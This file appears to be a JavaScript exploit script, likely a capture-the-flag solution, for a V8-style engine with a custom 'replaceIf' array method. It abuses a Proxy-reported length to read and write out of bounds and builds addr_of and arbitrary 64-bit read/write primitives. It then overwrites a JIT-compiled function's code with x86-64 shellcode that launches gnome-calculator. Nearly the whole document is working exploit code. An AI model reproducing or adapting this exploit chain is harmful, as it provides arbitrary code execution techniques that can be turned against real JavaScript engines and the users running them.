let conva = new ArrayBuffer(8);
let convi = new Uint32Array(conva);
let convf = new Float64Array(conva);

let shellcode = 
[72,184,1,1,1,1,1,1,1,1,80,72,184,46,99,104,111,46,114,105,1,72,49,4,36,72,137,231,106,114,72,184,97,108,99,117,108,97,116,111,80,72,184,47,103,110,111,109,101,45,99,80,72,184,47,117,115,114,47,98,105,110,80,72,137,230,106,1,254,12,36,86,87,106,59,88,72,137,230,153,15,5];


let toBig = (f) => {
    convf[0] = f;
    let b = BigInt(convi[1]) << 32n;
    b += BigInt(convi[0]);
    return b;
}

let fromBig = (b) => {
    convi[0] = Number(b & 0xffffffffn);
    convi[1] = Number(b >> 32n);
    return convf[0];
}

let rand_obj = {}
let target_float_array = new Array(10);
target_float_array.fill(1.1);

let target_jsvalue_array = new Array(10);
target_jsvalue_array.fill(rand_obj);

let target_typed_array = new ArrayBuffer(0x4000);
let victim_typed_array = new ArrayBuffer(0x5000);

let float_proxy = new Proxy(target_float_array, {
    get: function(obj, prop) {
        if (prop == 'length')
            return 0xffffffff;
        return obj[prop];
    }
});

let read_oob = (off) => {
    let n;
    float_proxy.replaceIf(off,function(d){
        n = toBig(d);
        return false;
    },0);
    return n;
}

let write_oob = (off, v) => {
    if (typeof(v) == 'bigint')
        v = fromBig(v);
    let n;
    float_proxy.replaceIf(off,function(d){
        return true;
    },v);
    return n;
}

let array_buffer_offset = null;
let jsvalue_array_offset = null;
for (let i = 0; i<100; i++) {
    let n = read_oob(i);
    console.log(n.toString(16));
    if (jsvalue_array_offset == null && n === 0xa00000000n) {
        jsvalue_array_offset = i;
    }
    if (array_buffer_offset === null && n === 0x400000000000n) {
        array_buffer_offset = i;
        break;
    }
}

if (array_buffer_offset === null || jsvalue_array_offset == null)
    throw("Could not find arrays, bad groom");

let prims = {
    addr_of: function(obj) {
        target_jsvalue_array[0] = obj;
        return read_oob(jsvalue_array_offset+5);
    }
};

let victim_array_addr = prims.addr_of(victim_typed_array) - 1n;
write_oob(array_buffer_offset+1, victim_array_addr);
let target_array_uint32 = new Uint32Array(target_typed_array);

prims.read64 = function(addr) {
    target_array_uint32[4*2] = Number(addr & 0xffffffffn);
    target_array_uint32[4*2+1] = Number(addr >> 32n);
    let buff = new Uint32Array(victim_typed_array);
    let v = BigInt(buff[1]) << 32n;
    v += BigInt(buff[0]);
    return v;
}

prims.write64 = function(addr, v) {
    target_array_uint32[4*2] = Number(addr & 0xffffffffn);
    target_array_uint32[4*2+1] = Number(addr >> 32n);
    let buff = new Uint32Array(victim_typed_array);
    buff[0] = Number(v & 0xffffffffn);
    buff[1] = Number(v >> 32n);
}

prims.arb_uint8 = function(addr) {
    target_array_uint32[4*2] = Number(addr & 0xffffffffn);
    target_array_uint32[4*2+1] = Number(addr >> 32n);
    return new Uint8Array(victim_typed_array);
}




let func_body  = "eval('');"
for (let i=0; i<2000; i++)
    func_body += "a[" + i.toString() + "];" 
let func_obj = new Function("a", func_body);

func_obj({});

//%DebugPrint(func_obj);
let func_obj_addr = prims.addr_of(func_obj) - 1n;
console.log('func_addr =',func_obj_addr.toString(16));

let jit_func_addr = prims.read64(func_obj_addr + 0x30n) -1n + 0x40n;
console.log('jit_addr =',jit_func_addr.toString(16));


prims.arb_uint8(jit_func_addr).set(shellcode);

//prims.write64(func_obj_addr + 0x30n, 0x4142434000n);
readline()
func_obj({});



/*

let b = new Uint32Array(target_typed_array);
%DebugPrint(victim_typed_array);
console.log(victim_array_addr.toString(16));
*/
//b[0] = 0x51525354;

//let prims = {
//    read64 = function(addr
//console.log(r);
//console.log(toBig(target_float_array[0]).toString(16))



